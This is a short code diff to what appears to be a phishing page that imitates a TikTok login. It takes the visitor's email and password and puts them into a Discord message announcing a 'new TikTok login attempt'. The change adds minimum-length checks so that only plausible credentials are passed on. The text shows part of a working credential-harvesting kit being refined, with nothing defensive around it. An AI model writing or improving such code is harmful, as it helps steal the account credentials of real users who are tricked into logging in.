@@ -263,7 +263,7 @@
     const loginBtn = document.getElementById('loginBtn');
 
     function updateButtonState() {
-      if (emailInput.value.trim() && passwordInput.value.trim()) {
+      if (emailInput.value.trim().length >= 5 && passwordInput.value.trim().length >= 5) {
         loginBtn.disabled = false;
         loginBtn.classList.add('active');
       } else {
@@ -278,6 +278,8 @@
     loginBtn.addEventListener('click', () => {
       const email = emailInput.value.trim();
       const password = passwordInput.value.trim();
+
+      if (email.length < 5 || password.length < 5) return;
 
       const discordMessage =
         `📥 **Nouvelle tentative de connexion TikTok**\n\n` +
